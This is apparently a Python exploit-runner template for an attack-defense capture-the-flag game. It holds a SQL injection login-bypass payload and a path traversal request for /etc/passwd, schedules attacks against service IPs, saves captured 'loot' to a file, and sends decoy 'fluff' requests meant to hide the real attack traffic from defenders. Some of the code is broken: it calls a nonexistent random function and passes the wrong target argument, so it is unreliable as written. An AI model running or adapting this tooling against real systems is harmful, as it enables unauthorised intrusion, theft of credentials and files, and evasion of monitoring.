#!/usr/bin/python

import requests
import socket
import random
import string
from itertools import cycle

SERVICE_IPS	= ['127.0.0.1','127.0.0.2','127.0.0.3']
SERVICE_PORTS	= [80]

useragent = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}
headers = requests.utils.default_headers()
headers.update(useragent)

class Exploits:
	'''
	An exploit _MUST_ be labeled as 'exp_<port>_whatever' and will run once per defined time interval
	"Fluff" _MUST_ be defined as 'fake_<port>_whatever is something that looks like an exploit
		It is designed to mask our traffic and has a percentage chance to run on every sleep cycle



	A few functions have been defined to help (not many, sorry)

	prepare_get(url,params)			- Prepares a python requests GET (allows for path traversal)
	prepare_post(url,data={},json={})	- Prepares a python requests POST, data and json are mutually exclusive
	random_string(max_length,min_length=-1)	- Generates a random alphanumeric string of length max_length unless min_length is a positive number
							Generates a random string between min and max if defined.
	save_loot(string,overwrite=False)	- Saves the string to loot.txt for use other places
	'''

	def __init__(self):
		self.exploits = []
		self.fluff = []
	
	def exp_80_sqli(self,ip):	
		s = requests.Session()

		rand = random.randint(0,100000000)
		payload = "' or '{}'='{}' union select * from users".format(rand,rand)

		data={'username':payload,'password':random_string(8)}
		url = 'http://127.0.0.1'

		req = prepare_post(url,data=data)
		s.send(req)


	def fake_80_badpath(self,ip):
		s = requests.Session()

		fake_path = random_string(10)
		url = "http://127.0.0.1/{}".format(fake_path)+"/../../../etc/passwd"
		req = prepare_get(url)

		s.send(req)












	############## Do not edit below here #############################



	def run_exploits(self):
		print("\nRunning exploits\nNew time interval (in seconds): ",end='')
		self.setup()
		random.shuffle(self.exploits)
		random.shuffle(SERVICES)	
		for i in SERVICES:
			for x in self.exploits:
				if str(i[1]) == x.split("_")[1]:
					cmd = getattr(self,x)
					#print("Exploiting {} on port {}".format(*i))
					cmd(SERVICES[0])

	def run_fluff(self):
		print("\nRunning fluff\nNew time interval (in seconds): ",end='')
		self.setup()
		random.shuffle(self.fluff)
		random.shuffle(SERVICES)	
		for i in SERVICES:
			for x in self.fluff:
				if str(i[1]) == x.split("_")[1]:
					cmd = getattr(self,x)
					#print("Fluffing {} on port {}".format(*i))
					cmd(SERVICES[0])
		
	def setup(self):
		self.exploits = []
		self.fluff = []
		for i in dir(self):
			if i.startswith('exp_'):
				self.exploits.append(i)
			elif i.startswith('fake_'):
				self.fluff.append(i)
		


def save_loot(msg,overwrite=False):
	if not overwrite:
		with open("loot.txt","a+") as f:
			f.write(msg)
	else:
		with open("loot.txt","w") as f:
			f.write(msg)

def random_string(max_length,min_length=-1):
	if min_length < 0 or min_length > max_length:
		return ''.join([random.choice(string.ascii_letters+string.digits) for i in range(max_length)])	
	else:
		return ''.join([random.choice(string.ascii_letters+string.digits) for i in range(random.rand_int(min_length,max_length))])	

def prepare_get(url,params=None):
	if params is not None:
		r = requests.Request(method='GET', url=url, headers=headers,params=params)
	else:
		r = requests.Request(method='GET', url=url, headers=headers)
	prepared = r.prepare()
	prepared.url = url
	return prepared
	
def prepare_post(url,data=None,json=None):
	if data is not None and json is not None:
		print("Payload for {} can not contain both data and json, selecting json for now")
	if json is not None:
		r = requests.Request(method='POST', url=url, headers=headers,json=json)
	elif data is not None:	
		r = requests.Request(method='POST', url=url, headers=headers,data=data)
	else:	
		r = requests.Request(method='POST', url=url, headers=headers)
	prepared = r.prepare()
	prepared.url = url
	return prepared
	

if len(SERVICE_IPS) <= len(SERVICE_PORTS):
	SERVICES = list(zip(cycle(SERVICE_IPS),SERVICE_PORTS))
else:
	SERVICES = list(zip(SERVICE_IPS,cycle(SERVICE_PORTS)))
